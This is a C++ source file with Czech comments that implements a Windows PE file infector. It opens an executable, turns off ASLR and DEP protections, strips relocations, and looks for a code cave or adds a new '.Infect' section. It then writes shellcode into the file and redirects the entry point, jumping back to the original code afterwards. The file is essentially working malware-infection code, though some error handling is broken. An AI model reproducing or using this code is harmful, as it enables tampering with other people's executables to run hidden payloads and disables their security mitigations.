#include "PEfile.h"
using namespace PE;
#pragma optimize("", off)

//otevreni souboru a kontrola zda soubor existuje, zachyceni velikosti
PE_file::PE_file(std::filesystem::path path_to_file)
{
	file_handle = CreateFile(path_to_file.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!file_handle)
	{
		EXIT_FAILURE;
	}
	file_size = GetFileSize(file_handle, NULL);
	if (file_size == 0)
	{
		EXIT_FAILURE;
	}
}


std::string PE_file::get_exe_name(const std::filesystem::path& p)
{
	std::string exe_path = p.u8string();
	int index = 0;
	std::string exe_name = "";

	for (auto it = exe_path.begin(); it != exe_path.end(); ++it)
	{
		if (*it == '\\' || *it == '/')
		{
			index = static_cast<int>(it - exe_path.begin());
		}
	}
	index++;

	for (auto it = exe_path.begin() + index; it != exe_path.end(); ++it)
	{
		exe_name += *it;
	}

	return exe_name;
}


bool PE_file::is_file_running(std::filesystem::path path)
{
	std::string exe_name = get_exe_name(path);


	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	//const char* process_name = "Project2.exe"
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	CString process_name = exe_name.c_str();

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, process_name) == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				return true;

				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
	return false;
}



//namapovani souboru do pameti pro naslednou manipulaci 
void PE_file::map_file()
{
	//predame FILE_HANDLE (ukazatel) a navrati se nam spustitelny soubor namapovany do pameti
	file_mapping = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0, file_size, NULL);
	if (!file_mapping)
	{
		std::cout << "file_mapping not found";
		EXIT_FAILURE;
	}

	//namapovany soubor preinterpretujeme jako ukazatel na Byte
	file_map_view = reinterpret_cast<LPBYTE>(MapViewOfFile(file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, file_size));
	if (!file_map_view)
	{
		std::cout << "file_map_view not found";
		EXIT_FAILURE;
	}
}

//funkce potrebna na spravne zazareni pridavneho kodu nebo sekce do pameti soubrou
DWORD PE_file::align(DWORD offset, DWORD aligment)
{
	if (offset % aligment == 0)
		return offset;
	return offset + (aligment - (offset % aligment));
}

//rozdelime soubor a ulozime potrebne hlavicky na dalsi praci
void PE_file::parse_file()
{
	//ukazatel na soubor v pameti v bytech pretypujeme na ukazatel na dos hlavicku
	dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(file_map_view);
	if (!dos_header)
	{
		std::cout << "dos_header not found";
		EXIT_FAILURE;
	}
	//pomoci e_lfanew se dostaneme k NT hlavicce
	nt_header = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(dos_header) + dos_header->e_lfanew);

	if (!nt_header)
	{
		std::cout << "NT header not found";
		EXIT_FAILURE;
	}

	if (nt_header->Signature == IMAGE_NT_SIGNATURE)
	{
		signature_verified = true;
	}
	else
	{
		signature_verified = false;
		EXIT_FAILURE;
	}


	if (nt_header->OptionalHeader.Magic == 0x10b)
	{
		std::cout << "file is 32-bit";
	}

	//Deaktivujeme nahodne rozlozeni adresoveho prostoru
	nt_header->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	nt_header->OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
	nt_header->OptionalHeader.DataDirectory[5].Size = { 0 };
	nt_header->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

	//Deaktivace prevence proti spusteni
	nt_header->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	nt_header->OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
	nt_header->OptionalHeader.DataDirectory[4].Size = { 0 };

	//ulozeni hlavicky prvni sekce
	first_section_header = reinterpret_cast<PIMAGE_SECTION_HEADER>(IMAGE_FIRST_SECTION(nt_header));

	//ulozeni hlavicky posledni sekce
	last_section_header = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + (nt_header->FileHeader.NumberOfSections - 1));

	//ulozeni puvodni adresy vstupniho bodu souboru, po infekci se preskakuje zpatky na tuto adresu
	//original_entry_point = (nt_header->OptionalHeader.AddressOfEntryPoint + nt_header->OptionalHeader.ImageBase);

	original_entry_point = (static_cast<DWORD>(nt_header->OptionalHeader.AddressOfEntryPoint) + static_cast<DWORD>(nt_header->OptionalHeader.ImageBase));
	//original_entry_point = static_cast<DWORD64>(nt_header->OptionalHeader.AddressOfEntryPoint);

	//original_entry_point = 140697087367924;

}


bool PE_file::check_32()
{
	return (nt_header->OptionalHeader.Magic == 0x10b) ? true : false;
}


//v pripade, ze soubor neobsahuje dostatecne velkou mezeru pro nas shellcode vytvorime novou sekci
void PE_file::add_new_section()
{
	is_section_new = true;
	//"odrazime" se od posledni hlavicky sekce
	infected_section = reinterpret_cast<PIMAGE_SECTION_HEADER>((DWORD)last_section_header + IMAGE_SIZEOF_SECTION_HEADER);

	//urcime jmeno sekce
	char section_name[] = ".Infect";
	std::size_t name_size = strlen(section_name);

	//ulozime nazev sekce
	memcpy(infected_section, section_name, name_size);

	//nastavime charakteristiku sekce tak, aby byla spustitelna, obsahovala kod a byla citelna
	infected_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
	infected_section->Characteristics ^= IMAGE_SCN_MEM_DISCARDABLE;

	//nastaveni parametru sekce a jejich rozlozeni pro spravne ulozeni do pameti a nasledne na disk pomoci funkce align
	infected_section->SizeOfRawData = align(size_of_shellcode + sizeof push + sizeof esp + sizeof original_entry_point, nt_header->OptionalHeader.FileAlignment);
	infected_section->VirtualAddress = align((last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize), nt_header->OptionalHeader.SectionAlignment);
	infected_section->PointerToRawData = align((last_section_header->PointerToRawData + last_section_header->SizeOfRawData), nt_header->OptionalHeader.FileAlignment);
	infected_section->Misc.VirtualSize = align(size_of_shellcode, nt_header->OptionalHeader.SectionAlignment);

	//zvysime pocet sekci o jednu
	nt_header->FileHeader.NumberOfSections += 1;

	//zmenime velikost souboru
	nt_header->OptionalHeader.SizeOfImage = align((nt_header->OptionalHeader.SizeOfImage + infected_section->Misc.VirtualSize), nt_header->OptionalHeader.SectionAlignment);
	//nt_header->OptionalHeader.SizeOfImage = align((nt_header->OptionalHeader.SizeOfImage + (DWORD)(sizeof(IMAGE_SECTION_HEADER)*6)), nt_header->OptionalHeader.SectionAlignment);
	nt_header->OptionalHeader.SizeOfHeaders = align((nt_header->OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_SECTION_HEADER), nt_header->OptionalHeader.FileAlignment);

}

//funkce hleda dostatecne velky prostor v jednotlivych sekcich pro nas shellcode
void PE_file::find_code_cave()
{

	PIMAGE_SECTION_HEADER current_section;
	PIMAGE_SECTION_HEADER final_section = first_section_header;

	DWORD code_cave = 0;
	DWORD code_index = 0;
	bool found_cave = false;

	//projdeme pomoci dvou cyklu for jednotlive sekce a hledame dostatecne velky prostor (posloupnost 0x00)
	for (int i = 0; i < nt_header->FileHeader.NumberOfSections - 1; i++)
	{
		current_section = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + i);
		for (int j = 0; j < current_section->SizeOfRawData; j++)
		{
			if (file_map_view[current_section->PointerToRawData + j] == 0x00)
			{
				code_cave++;
				code_index = j;
				//pokud dojde k nalezeni dostatecne velkeho prostoru ukoncime cyklus a ulozime si index na ktery musime skocit pri kopirovani do souboru ulozeneho v pameti
				if (code_cave == size_of_shellcode_full)
				{
					code_index -= size_of_shellcode_full;
					found_cave = true;
					break;
				}
			}
			else
			{
				code_cave = 0;
			}
		}
		if (found_cave)
		{
			final_section = current_section;
			break;
		}
		code_cave = 0;
		code_index = 0;
	}
	//pokud nebyl nalezen dostatecne velky prostor vytvorime novou sekci
	if (!found_cave)
	{
		add_new_section();
	}
	else
	{
		shellcode_index = code_index + 1;
		signature_verified = false;
		infected_section = final_section;
		//
		//infected_section->Misc.VirtualSize += size_of_shellcode;
		infected_section->Misc.VirtualSize += size_of_shellcode + 9;
		//nastaveni charakteristik
		infected_section->Characteristics |= IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
		//zmena adresy vstupniho bodu souboru
		nt_header->OptionalHeader.AddressOfEntryPoint = infected_section->VirtualAddress + shellcode_index;
		//nt_header->OptionalHeader.AddressOfEntryPoint = infected_section->VirtualAddress + infected_section->PointerToRawData + shellcode_index;
	}
}


void PE_file::infect_into_section(const char* shellcode)
{
	if (is_section_new)
	{
		//zmena adresy vstupniho bodu souboru
		nt_header->OptionalHeader.AddressOfEntryPoint = infected_section->VirtualAddress;
		std::cout << "new_section" << std::endl;

		DWORD bytes_written = 0;

		SetFilePointer(file_handle, 0, NULL, FILE_END);

		char inject_sec = 0x00;
		//doplnime zbyle data sekce nulami
		for (int i = 0; i < infected_section->SizeOfRawData; i++)
		{
			WriteFile(file_handle, &inject_sec, 1, &bytes_written, NULL);
		}
		//vlozime shellcode
		memcpy(&file_map_view[infected_section->PointerToRawData], shellcode, size_of_shellcode - 1);
		//vlozim originalni vstubni bod souboru do zasobniku 
		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode - 1], push, sizeof push);
		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
		//pote preskocim na danou adresu
		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
	}
	else
	{
		std::cout << "code cave" << std::endl;
		//vlozime shellcode
		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index], shellcode, size_of_shellcode - 1);
		//vlozim originalni vstubni bod souboru do zasobniku
		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode - 1], push, sizeof push);
		////memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push - 2], "\xe9", sizeof "\xe9");
		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
		////pote preskocim na danou adresu
		//memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], "\xff\xe0", sizeof "\xff\xe0");

		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point + sizeof esp - 3], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");

	}
}


void PE_file::freeFile()
{
	UnmapViewOfFile(file_map_view);
	//CloseHandle(append_handle);
	CloseHandle(file_mapping);
	CloseHandle(file_handle);
}

PE_file::~PE_file()
{
	freeFile();
}